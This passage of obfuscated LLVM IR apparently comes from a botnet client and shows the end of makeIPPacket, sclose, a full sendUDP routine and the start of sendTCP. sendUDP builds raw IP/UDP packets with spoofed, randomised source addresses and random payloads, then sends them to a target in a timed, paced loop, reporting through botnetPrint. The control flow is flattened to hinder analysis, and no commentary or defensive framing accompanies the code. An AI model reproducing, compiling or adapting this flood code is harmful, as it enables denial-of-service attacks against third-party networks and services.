  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 205618557, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 205618557, label %first
    i32 1539196131, label %7
    i32 -1648542039, label %8
    i32 2033982339, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 1539196131, i32 -1648542039
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 2033982339, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 2033982339, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1878987710, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1878987710, label %first
    i32 765644259, label %38
    i32 1489899040, label %42
    i32 -425390079, label %47
    i32 1810335349, label %53
    i32 727285231, label %54
    i32 1203108871, label %61
    i32 1939032011, label %66
    i32 -1845860263, label %69
    i32 -1306105180, label %77
    i32 1461869293, label %78
    i32 412081234, label %90
    i32 -1016925408, label %101
    i32 951096283, label %105
    i32 -867746250, label %109
    i32 2046802546, label %115
    i32 2064538966, label %116
    i32 391042662, label %117
    i32 -1975688431, label %124
    i32 89435448, label %128
    i32 -1115411906, label %131
    i32 1961763967, label %132
    i32 2126338889, label %137
    i32 1438358009, label %140
    i32 1762045375, label %146
    i32 -554468930, label %149
    i32 -82354569, label %150
    i32 -1249640086, label %155
    i32 20204529, label %162
    i32 -1042409895, label %166
    i32 -1296807676, label %167
    i32 268471536, label %173
    i32 1214905095, label %213
    i32 -821324994, label %215
    i32 1897244629, label %220
    i32 -1639939339, label %247
    i32 143756299, label %248
    i32 -2077518690, label %261
    i32 -1548278271, label %263
    i32 -2083057855, label %268
    i32 -56749408, label %295
    i32 -537424386, label %301
    i32 -966363026, label %302
    i32 407754455, label %303
    i32 -1450348254, label %310
    i32 1876584953, label %314
    i32 1885007571, label %317
    i32 -1747182597, label %319
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp eq i32 %.reload, 0
  %37 = select i1 %36, i32 765644259, i32 1489899040
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  store i32 -425390079, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #10
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  store i32 -425390079, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 1810335349, i32 727285231
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1747182597, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  %60 = select i1 %59, i32 1203108871, i32 1961763967
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @socket(i32 2, i32 2, i32 17) #3
  store i32 %62, i32* %19, align 4
  %63 = load i32, i32* %19, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 -1845860263, i32 1939032011
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* @KadenCommStock, align 4
  %68 = call i32 (i32, i8*, ...) @botnetPrint(i32 %67, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  store i32 -1747182597, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %13, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = call noalias i8* @malloc(i64 %72) #3
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  %76 = select i1 %75, i32 -1306105180, i32 1461869293
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -1747182597, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %20, align 8
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i8*, i8** %20, align 8
  %84 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %83, i32 %84)
  %85 = call i64 @time(i64* null) #3
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = add nsw i64 %85, %87
  %89 = trunc i64 %88 to i32
  store i32 %89, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 412081234, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %19, align 4
  %92 = load i8*, i8** %20, align 8
  %93 = load i32, i32* %13, align 4
  %94 = sext i32 %93 to i64
  %95 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %96 = call i64 @sendto(i32 %91, i8* %92, i64 %94, i32 0, %struct.sockaddr* %95, i32 16)
  %97 = load i32, i32* %22, align 4
  %98 = load i32, i32* %18, align 4
  %99 = icmp eq i32 %97, %98
  %100 = select i1 %99, i32 -1016925408, i32 391042662
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* %10, align 4
  %103 = icmp eq i32 %102, 0
  %104 = select i1 %103, i32 951096283, i32 -867746250
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  store i32 -867746250, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = call i64 @time(i64* null) #3
  %111 = load i32, i32* %21, align 4
  %112 = sext i32 %111 to i64
  %113 = icmp sgt i64 %110, %112
  %114 = select i1 %113, i32 2046802546, i32 2064538966
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 -1115411906, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 412081234, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %22, align 4
  %119 = add i32 %118, 1
  store i32 %119, i32* %22, align 4
  %120 = load i32, i32* %23, align 4
  %121 = load i32, i32* %15, align 4
  %122 = icmp eq i32 %120, %121
  %123 = select i1 %122, i32 -1975688431, i32 89435448
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %16, align 4
  %126 = mul nsw i32 %125, 1000
  %127 = call i32 @usleep(i32 %126)
  store i32 0, i32* %23, align 4
  store i32 412081234, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %23, align 4
  %130 = add i32 %129, 1
  store i32 %130, i32* %23, align 4
  store i32 412081234, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 -1747182597, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %133, i32* %24, align 4
  %134 = load i32, i32* %24, align 4
  %135 = icmp ne i32 %134, 0
  %136 = select i1 %135, i32 1438358009, i32 2126338889
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* @KadenCommStock, align 4
  %139 = call i32 (i32, i8*, ...) @botnetPrint(i32 %138, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  store i32 -1747182597, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  store i32 1, i32* %25, align 4
  %141 = load i32, i32* %24, align 4
  %142 = bitcast i32* %25 to i8*
  %143 = call i32 @setsockopt(i32 %141, i32 0, i32 3, i8* %142, i32 4) #3
  %144 = icmp slt i32 %143, 0
  %145 = select i1 %144, i32 1762045375, i32 -554468930
  store i32 %145, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* @KadenCommStock, align 4
  %148 = call i32 (i32, i8*, ...) @botnetPrint(i32 %147, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i32 0, i32 0))
  store i32 -1747182597, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  store i32 50, i32* %26, align 4
  store i32 -82354569, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %26, align 4
  %152 = add nsw i32 %151, -1
  store i32 %152, i32* %26, align 4
  %153 = icmp ne i32 %151, 0
  %154 = select i1 %153, i32 -1249640086, i32 20204529
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = call i64 @time(i64* null) #3
  %157 = call i32 @rand_cmwc()
  %158 = zext i32 %157 to i64
  %159 = xor i64 %156, %158
  %160 = trunc i64 %159 to i32
  call void @srand(i32 %160) #3
  %161 = call i32 @rand() #3
  call void @init_rand(i32 %161)
  store i32 -82354569, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %12, align 4
  %164 = icmp eq i32 %163, 0
  %165 = select i1 %164, i32 -1042409895, i32 -1296807676
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 268471536, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i32, i32* %12, align 4
  %169 = sub nsw i32 32, %168
  %170 = shl i32 1, %169
  %171 = sub nsw i32 %170, 1
  %172 = xor i32 %171, -1
  store i32 %172, i32* %27, align 4
  store i32 268471536, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %13, align 4
  %175 = sext i32 %174 to i64
  %176 = add i64 28, %175
  store i64 %176, i64* %.reg2mem2
  %177 = call i8* @llvm.stacksave()
  store i8* %177, i8** %28, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %178 = alloca i8, i64 %.reload4, align 16
  store i8* %178, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %179 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %179, %struct.iphdr** %29, align 8
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = bitcast %struct.iphdr* %180 to i8*
  %182 = getelementptr i8, i8* %181, i64 20
  %183 = bitcast i8* %182 to %struct.udphdr*
  store %struct.udphdr* %183, %struct.udphdr** %30, align 8
  %184 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %186 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 4
  %188 = load i32, i32* %27, align 4
  %189 = call i32 @GRIP(i32 %188)
  %190 = call i32 @htonl(i32 %189) #10
  %191 = load i32, i32* %13, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 8, %192
  %194 = trunc i64 %193 to i32
  call void @makeIPPacket(%struct.iphdr* %184, i32 %187, i32 %190, i8 zeroext 17, i32 %194)
  %195 = load i32, i32* %13, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 8, %196
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #10
  %200 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.1* %201 to %struct.anon.3*
  %203 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %202, i32 0, i32 2
  store i16 %199, i16* %203, align 2
  %204 = call i32 @rand_cmwc()
  %205 = trunc i32 %204 to i16
  %206 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %207 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %206, i32 0, i32 0
  %208 = bitcast %union.anon.1* %207 to %struct.anon.3*
  %209 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %208, i32 0, i32 0
  store i16 %205, i16* %209, align 2
  %210 = load i32, i32* %10, align 4
  %211 = icmp eq i32 %210, 0
  %212 = select i1 %211, i32 1214905095, i32 -821324994
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = call i32 @rand_cmwc()
  store i32 1897244629, i32* %switchVar
  store i32 %214, i32* %.reg2mem10
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %10, align 4
  %217 = trunc i32 %216 to i16
  %218 = call zeroext i16 @htons(i16 zeroext %217) #10
  %219 = zext i16 %218 to i32
  store i32 1897244629, i32* %switchVar
  store i32 %219, i32* %.reg2mem10
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %221 = trunc i32 %.reload11 to i16
  %222 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %223 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.1* %223 to %struct.anon.3*
  %225 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %224, i32 0, i32 1
  store i16 %221, i16* %225, align 2
  %226 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.1* %227 to %struct.anon.3*
  %229 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %228, i32 0, i32 3
  store i16 0, i16* %229, align 2
  %230 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %231 = bitcast %struct.udphdr* %230 to i8*
  %232 = getelementptr inbounds i8, i8* %231, i64 8
  %233 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %232, i32 %233)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %234 = bitcast i8* %.reload8 to i16*
  %235 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 2
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = call zeroext i16 @csum(i16* %234, i32 %238)
  %240 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 7
  store i16 %239, i16* %241, align 2
  %242 = call i64 @time(i64* null) #3
  %243 = load i32, i32* %11, align 4
  %244 = sext i32 %243 to i64
  %245 = add nsw i64 %242, %244
  %246 = trunc i64 %245 to i32
  store i32 %246, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 -1639939339, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 143756299, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i32, i32* %24, align 4
  %250 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %251 = call i64 @sendto(i32 %249, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %250, i32 16)
  %252 = call i32 @rand_cmwc()
  %253 = trunc i32 %252 to i16
  %254 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.1* %255 to %struct.anon.3*
  %257 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %256, i32 0, i32 0
  store i16 %253, i16* %257, align 2
  %258 = load i32, i32* %10, align 4
  %259 = icmp eq i32 %258, 0
  %260 = select i1 %259, i32 -2077518690, i32 -1548278271
  store i32 %260, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = call i32 @rand_cmwc()
  store i32 -2083057855, i32* %switchVar
  store i32 %262, i32* %.reg2mem12
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %10, align 4
  %265 = trunc i32 %264 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #10
  %267 = zext i16 %266 to i32
  store i32 -2083057855, i32* %switchVar
  store i32 %267, i32* %.reg2mem12
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %269 = trunc i32 %.reload13 to i16
  %270 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon.1* %271 to %struct.anon.3*
  %273 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %272, i32 0, i32 1
  store i16 %269, i16* %273, align 2
  %274 = call i32 @rand_cmwc()
  %275 = trunc i32 %274 to i16
  %276 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 3
  store i16 %275, i16* %277, align 4
  %278 = load i32, i32* %27, align 4
  %279 = call i32 @GRIP(i32 %278)
  %280 = call i32 @htonl(i32 %279) #10
  %281 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 8
  store i32 %280, i32* %282, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %283 = bitcast i8* %.reload6 to i16*
  %284 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 2
  %286 = load i16, i16* %285, align 2
  %287 = zext i16 %286 to i32
  %288 = call zeroext i16 @csum(i16* %283, i32 %287)
  %289 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 7
  store i16 %288, i16* %290, align 2
  %291 = load i32, i32* %32, align 4
  %292 = load i32, i32* %18, align 4
  %293 = icmp eq i32 %291, %292
  %294 = select i1 %293, i32 -56749408, i32 407754455
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = call i64 @time(i64* null) #3
  %297 = load i32, i32* %31, align 4
  %298 = sext i32 %297 to i64
  %299 = icmp sgt i64 %296, %298
  %300 = select i1 %299, i32 -537424386, i32 -966363026
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 1885007571, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i32 -1639939339, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i32, i32* %32, align 4
  %305 = add i32 %304, 1
  store i32 %305, i32* %32, align 4
  %306 = load i32, i32* %33, align 4
  %307 = load i32, i32* %15, align 4
  %308 = icmp eq i32 %306, %307
  %309 = select i1 %308, i32 -1450348254, i32 1876584953
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  %311 = load i32, i32* %16, align 4
  %312 = mul nsw i32 %311, 1000
  %313 = call i32 @usleep(i32 %312)
  store i32 0, i32* %33, align 4
  store i32 -1639939339, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i32, i32* %33, align 4
  %316 = add i32 %315, 1
  store i32 %316, i32* %33, align 4
  store i32 -1639939339, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %318)
  store i32 -1747182597, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %317, %314, %310, %303, %302, %301, %295, %268, %263, %261, %248, %247, %220, %215, %213, %173, %167, %166, %162, %155, %150, %149, %146, %140, %137, %132, %131, %128, %124, %117, %116, %115, %109, %105, %101, %90, %78, %77, %69, %66, %61, %54, %53, %47, %42, %38, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i32 @usleep(i32) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -508535236, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -508535236, label %first
    i32 111927847, label %31
    i32 1999873439, label %35
    i32 720301149, label %40
    i32 246053933, label %46
    i32 1842487655, label %47
    i32 566558591, label %54
    i32 -149334161, label %57
    i32 -733754333, label %63
    i32 1985424153, label %66
    i32 1279151815, label %70
    i32 696613259, label %71
    i32 315289700, label %77
    i32 -2118564320, label %125
    i32 632099092, label %161
    i32 819631171, label %164
    i32 39737409, label %168
    i32 -1167303776, label %173
    i32 1634932635, label %181
    i32 -1686469734, label %186
    i32 -1677812574, label %194
    i32 1402610445, label %199
    i32 -1162992177, label %207
    i32 -579598427, label %212
    i32 -339525484, label %220
    i32 -1743886831, label %225
    i32 1526493667, label %233
    i32 1365198170, label %237
    i32 877003622, label %238
    i32 -1297048117, label %239
    i32 -757188779, label %240
    i32 -931761141, label %241
    i32 1220561747, label %243
    i32 2080756218, label %244
    i32 470277821, label %262
    i32 -1933033872, label %264
    i32 -1143675765, label %269
    i32 -480766125, label %295
    i32 744563781, label %296
    i32 -532014488, label %343
    i32 -823537740, label %349
    i32 1411127008, label %350
    i32 22357125, label %351
    i32 1910411002, label %354
    i32 338350372, label %356
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 111927847, i32 1999873439
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 720301149, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 720301149, i32* %switchVar
  br label %loopEnd

